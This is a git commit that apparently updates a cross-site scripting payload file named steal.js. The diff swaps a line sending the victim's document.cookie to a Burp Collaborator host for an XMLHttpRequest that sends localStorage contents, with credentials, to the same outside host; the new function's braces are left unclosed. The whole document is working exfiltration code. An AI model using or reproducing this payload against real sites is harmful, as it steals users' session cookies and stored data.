bc90febaa2feaeeb9a178dac65da0a69abe684bf
tstaeg <57662024+tstaeg@users.noreply.github.com>
2020-06-25 13:33:59 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,2 +1,8 @@
-document.write("<img src='http://a3egucu8gk0d98yvoxa5j995vw1tpi.burpcollaborator.net/becrop?cookie="+escape(document.cookie)+"'/>");
-alert("Cookien sent: "+document.cookie);
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() { if (xhr.readyState == 4)
+{
+console.log("Storage sent: "+localStorage);
+}
+xhr.open('GET', '//a3egucu8gk0d98yvoxa5j995vw1tpi.burpcollaborator.net/becrop/?data='+localStorage,true);
+xhr.withCredentials = true;xhr.send(null);
+
